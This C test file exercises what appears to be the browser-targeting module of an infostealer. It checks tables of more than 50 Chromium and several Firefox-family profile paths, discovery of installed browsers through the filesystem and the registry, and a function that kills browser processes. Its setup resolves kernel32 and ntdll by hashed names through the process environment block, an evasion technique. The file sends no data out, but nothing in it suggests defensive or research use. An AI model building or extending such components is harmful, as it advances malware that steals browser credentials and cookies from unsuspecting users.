/*
 * test_chromium.c — Browser path enumeration tests
 *
 * Uses ZIALFI_TEST_MODE to mock kernel32/ntdll module lookups,
 * enabling full FS/registry/kill code path coverage.
 */
#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "browser_paths.h"
#include "hash.h"
#include "peb.h"
#include "config.h"


static void setup_module_mocks(void) {
    uint32_t h_lower = mirage_encrypted_hash_module("kernel32.dll");
    uint32_t h_upper = mirage_encrypted_hash_module("KERNEL32.DLL");
    void *k32 = mirage_get_module_by_hash(h_lower);
    if (!k32) k32 = mirage_get_module_by_hash(h_upper);
    if (k32) {
        mirage_peb_mock_module(h_lower, k32);
        mirage_peb_mock_module(h_upper, k32);
    }
    uint32_t h_nt_lower = mirage_encrypted_hash_module("ntdll.dll");
    uint32_t h_nt_upper = mirage_encrypted_hash_module("NTDLL.DLL");
    void *ntdll = mirage_get_module_by_hash(h_nt_lower);
    if (!ntdll) ntdll = mirage_get_module_by_hash(h_nt_upper);
    if (ntdll) {
        mirage_peb_mock_module(h_nt_lower, ntdll);
        mirage_peb_mock_module(h_nt_upper, ntdll);
    }
    printf("  MOCK: k32=%p ntdll=%p\n", k32, ntdll);
}

static void test_chromium_table(void) {
    size_t count = 0;
    const BrowserPath *b = get_chromium_browsers(&count);
    assert(b != NULL);
    assert(count >= 50);
    for (size_t i = 0; i < count; i++) {
        assert(b[i].name != NULL);
        assert(strlen(b[i].name) > 0);
        assert(b[i].path_suffix != NULL);
    }
    printf("  PASS: chromium table (%zu entries)\n", count);
}

static void test_gecko_table(void) {
    size_t count = 0;
    const BrowserPath *b = get_gecko_browsers(&count);
    assert(b != NULL);
    assert(count >= 5);
    for (size_t i = 0; i < count; i++) {
        assert(b[i].name != NULL);
        assert(strlen(b[i].name) > 0);
    }
    printf("  PASS: gecko table (%zu entries)\n", count);
}

static void test_chromium_unique_names(void) {
    size_t count = 0;
    const BrowserPath *b = get_chromium_browsers(&count);
    for (size_t i = 0; i < count; i++)
        for (size_t j = i + 1; j < count; j++)
            assert(strcmp(b[i].name, b[j].name) != 0);
    printf("  PASS: chromium names unique\n");
}

static void test_gecko_unique_names(void) {
    size_t count = 0;
    const BrowserPath *b = get_gecko_browsers(&count);
    for (size_t i = 0; i < count; i++)
        for (size_t j = i + 1; j < count; j++)
            assert(strcmp(b[i].name, b[j].name) != 0);
    printf("  PASS: gecko names unique\n");
}

static void test_fs_discover_chromium(void) {
    BrowserPath out[64];
    size_t count = 0;
    int rc = discover_chromium_browsers_fs(out, 64, &count);
    if (rc == 0 && count > 0) {
        for (size_t i = 0; i < count; i++) {
            assert(out[i].name != NULL);
            assert(strlen(out[i].name) > 0);
            assert(out[i].path_suffix != NULL);
        }
        printf("  PASS: FS chromium found %zu\n", count);
    } else {
        printf("  SKIP: FS chromium (rc=%d, count=%zu)\n", rc, count);
    }
}

static void test_fs_discover_gecko(void) {
    BrowserPath out[32];
    size_t count = 0;
    int rc = discover_gecko_browsers_fs(out, 32, &count);
    if (rc == 0 && count > 0) {
        for (size_t i = 0; i < count; i++) {
            assert(out[i].name != NULL);
            assert(out[i].path_suffix != NULL);
            assert(out[i].use_roaming == 1);
        }
        printf("  PASS: FS gecko found %zu\n", count);
    } else {
        printf("  SKIP: FS gecko (rc=%d)\n", rc);
    }
}

static void test_registry_discover(void) {
    BrowserPath out[64];
    size_t count = 0;
    int rc = discover_chromium_browsers_registry(out, 64, &count);
    if (rc == 0 && count > 0) {
        for (size_t i = 0; i < count; i++) {
            assert(out[i].name != NULL);
            assert(strlen(out[i].name) > 0);
            assert(out[i].path_suffix != NULL);
        }
        printf("  PASS: Registry chromium found %zu\n", count);
    } else {
        printf("  SKIP: Registry chromium (rc=%d, count=%zu)\n", rc, count);
    }
}

static void test_chromium_merged(void) {
    size_t count1 = 0;
    const BrowserPath *b1 = get_chromium_browsers(&count1);
    assert(b1 != NULL);
    size_t count2 = 0;
    const BrowserPath *b2 = get_chromium_browsers(&count2);
    assert(b2 == b1);
    assert(count2 == count1);
    printf("  PASS: chromium merged (%zu, cache hit)\n", count1);
}

static void test_gecko_merged(void) {
    size_t count1 = 0;
    const BrowserPath *b1 = get_gecko_browsers(&count1);
    assert(b1 != NULL);
    size_t count2 = 0;
    const BrowserPath *b2 = get_gecko_browsers(&count2);
    assert(b2 == b1);
    assert(count2 == count1);
    printf("  PASS: gecko merged (%zu, cache hit)\n", count1);
}

static void test_kill_null(void) {
    kill_browser_processes(NULL);
    printf("  PASS: kill(NULL) no crash\n");
}

static void test_kill_nonexistent(void) {
    int rc = kill_browser_processes("nonexistent_xyz_12345");
    assert(rc <= 0);
    printf("  PASS: kill nonexistent = %d\n", rc);
}

static void test_fs_discover_zero_max(void) {
    BrowserPath out[1];
    size_t count = 99;
    int rc = discover_chromium_browsers_fs(out, 0, &count);
    assert(rc == -1);
    printf("  PASS: FS zero max = -1\n");
}

static void test_fs_discover_null(void) {
    size_t count = 0;
    int rc = discover_chromium_browsers_fs(NULL, 64, &count);
    assert(rc == -1);
    printf("  PASS: FS NULL = -1\n");
}

static void test_chromium_roaming(void) {
    size_t count = 0;
    const BrowserPath *b = get_chromium_browsers(&count);
    int n = 0;
    for (size_t i = 0; i < count; i++)
        if (b[i].use_roaming) n++;
    assert(n >= 2);
    printf("  PASS: roaming=%d\n", n);
}

static void test_chromium_process_names(void) {
    size_t count = 0;
    const BrowserPath *b = get_chromium_browsers(&count);
    int n = 0;
    for (size_t i = 0; i < count; i++) {
        if (b[i].process_name && b[i].process_name[0]) {
            n++;
        }
    }
    assert(n > 0);
    printf("  PASS: proc_names=%d/%zu\n", n, count);
}

static void test_gecko_null_args(void) {
    BrowserPath out[1];
    size_t count = 0;
    assert(discover_gecko_browsers_fs(NULL, 10, &count) == -1);
    assert(discover_gecko_browsers_fs(out, 0, &count) == -1);
    count = 99;
    assert(discover_gecko_browsers_fs(out, 0, &count) == -1);
    printf("  PASS: gecko NULL/zero args\n");
}

static void test_gecko_process_names(void) {
    size_t count = 0;
    const BrowserPath *b = get_gecko_browsers(&count);
    int n = 0;
    for (size_t i = 0; i < count; i++) {
        if (b[i].process_name && b[i].process_name[0]) {
            n++;
        }
    }
    assert(n > 0);
    printf("  PASS: gecko proc=%d/%zu\n", n, count);
}

int main(void) {
    printf("=== test_chromium ===\n");
    setup_module_mocks();
    test_chromium_table();
    test_gecko_table();
    test_chromium_unique_names();
    test_gecko_unique_names();
    test_fs_discover_chromium();
    test_fs_discover_gecko();
    test_registry_discover();
    test_chromium_merged();
    test_gecko_merged();
    test_kill_null();
    test_kill_nonexistent();
    test_fs_discover_zero_max();
    test_fs_discover_null();
    test_chromium_roaming();
    test_chromium_process_names();
    test_gecko_null_args();
    test_gecko_process_names();
    printf("=== test_chromium: ALL PASSED ===\n");
    return 0;
}
